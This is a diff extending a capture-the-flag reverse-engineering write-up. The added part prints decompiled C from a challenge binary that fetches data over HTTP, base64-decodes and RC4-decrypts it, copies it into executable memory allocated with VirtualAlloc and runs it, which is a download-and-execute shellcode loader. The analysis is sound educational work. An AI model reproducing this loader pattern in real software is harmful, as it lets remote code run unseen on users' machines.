@@ -441,3 +441,66 @@ for c in product("0123456789",repeat=6):
 - Patching the right key into the memory, after a bit of debugging and we have the flag
 
 ![image](https://github.com/user-attachments/assets/cc37edb4-90df-44a5-873a-7aab7245bff5)
+
+- But thats only the first tcp stream of the `PCAPNG` file, so what is the second one for? Keep debugging and you will see this function
+```C
+void __thiscall sub_173AC0(void *this)
+{
+  void (*v2)(void); // eax
+  void **v3; // ecx
+  void (*v4)(void); // esi
+  void *v5; // ecx
+  void *v6; // ecx
+  void *v7[9]; // [esp-18h] [ebp-64h] BYREF
+  void *Block[5]; // [esp+Ch] [ebp-40h] BYREF
+  unsigned int v9; // [esp+20h] [ebp-2Ch]
+  void *Src[5]; // [esp+24h] [ebp-28h] BYREF
+  unsigned int v11; // [esp+38h] [ebp-14h]
+  int v12; // [esp+48h] [ebp-4h]
+
+  Block[4] = 0;
+  v9 = 7;
+  LOWORD(Block[0]) = 0;
+  memmove_thing(Block, L"sce", 3u);
+  v7[6] = 0;
+  v12 = 0;
+  another_memmove(v7, Block);
+  (*(void (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);// call to http 
+  (*(void (__thiscall **)(void *, void **))(*(_DWORD *)this + 36))(this, Src);// call to base64 decode and rc4 decrypt
+  LOBYTE(v12) = 1;
+  v2 = (void (*)(void))VirtualAlloc(0, 0x2000u, 0x3000u, 0x40u);
+  v3 = Src;
+  if ( v11 >= 8 )
+    v3 = (void **)Src[0];
+  v4 = v2;
+  memmove(v2, v3, 0x2000u);
+  v4();
+  if ( v11 >= 8 )
+  {
+    v5 = Src[0];
+    if ( 2 * v11 + 2 >= 0x1000 )
+    {
+      v5 = (void *)*((_DWORD *)Src[0] - 1);
+      if ( (unsigned int)(Src[0] - v5 - 4) > 0x1F )
+        goto LABEL_12;
+    }
+    free(v5);
+  }
+  Src[4] = 0;
+  v11 = 7;
+  LOWORD(Src[0]) = 0;
+  if ( v9 < 8 )
+    return;
+  v6 = Block[0];
+  if ( 2 * v9 + 2 >= 0x1000 )
+  {
+    v6 = (void *)*((_DWORD *)Block[0] - 1);
+    if ( (unsigned int)(Block[0] - v6 - 4) > 0x1F )
+LABEL_12:
+      _invalid_parameter_noinfo_noreturn();
+  }
+  free(v6);
+}
+```
+
+![Uploading image.png…]()
